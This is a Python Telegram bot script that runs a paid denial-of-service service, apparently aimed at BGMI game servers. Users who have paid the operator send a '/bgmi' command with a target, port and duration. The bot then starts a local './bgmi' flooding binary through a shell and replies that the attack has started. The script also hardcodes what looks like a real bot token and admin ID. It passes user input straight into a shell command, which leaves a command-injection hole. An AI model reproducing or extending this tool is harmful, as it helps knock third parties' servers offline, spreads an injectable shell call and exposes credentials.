#!/usr/bin/python3
import telebot
import subprocess
import datetime
import os

# Configuration
bot = telebot.TeleBot('8953295404:AAF3F3yDKrHuwu6MsuC3BjmR-izdHU2iJ6E')
admin_id = ["6403557650"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Utility Functions
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Handlers
@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file: file.write(f"{user_to_add}\n")
                bot.reply_to(message, f"User {user_to_add} Added Successfully 👍.")
            else:
                bot.reply_to(message, "User already exists 🤦‍♂️.")
        else:
            bot.reply_to(message, "Please specify a user ID.")
    else:
        bot.reply_to(message, "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids: file.write(f"{uid}\n")
                bot.reply_to(message, f"User {user_to_remove} removed successfully 👍.")
            else:
                bot.reply_to(message, f"User {user_to_remove} not found ❌.")
    else:
        bot.reply_to(message, "Pahle @BhaiCharaYT Bhai Se Puch Ke Aa 😡.")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if str(message.chat.id) in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            msg = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            for uid in allowed_user_ids:
                try: bot.send_message(uid, msg)
                except: pass
            bot.reply_to(message, "Broadcast Sent Successfully 👍.")
        else:
            bot.reply_to(message, "Please provide a message.")
    else:
        bot.reply_to(message, "Pahle @BhaiCharaYT Bhai Se Puchh Ke Aa 😡.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], int(command[2]), int(command[3])
            if time > 300:
                bot.reply_to(message, "Error: Time must be less than 300.")
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                subprocess.Popen(f"./bgmi {target} {port} {time} 300", shell=True)
                bot.reply_to(message, f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\nTarget: {target}\nPort: {port}\nTime: {time}")
        else:
            bot.reply_to(message, "✅ Usage :- /bgmi <target> <port> <time>")
    else:
        bot.reply_to(message, "❌ Pahle Kharid Ke Aa @BhaiCharaYT Bhai Se ❌.")

@bot.message_handler(commands=['start', 'help', 'admincmd'])
def show_info(message):
    if '/help' in message.text:
        bot.reply_to(message, "Available: /bgmi, /mylogs, /rules, /plan")
    elif '/admincmd' in message.text:
        bot.reply_to(message, "Admin: /add, /remove, /clearlogs, /logs, /broadcast")
    else:
        bot.reply_to(message, "Welcome to @BhaiCharaYTddos!")

bot.polling()
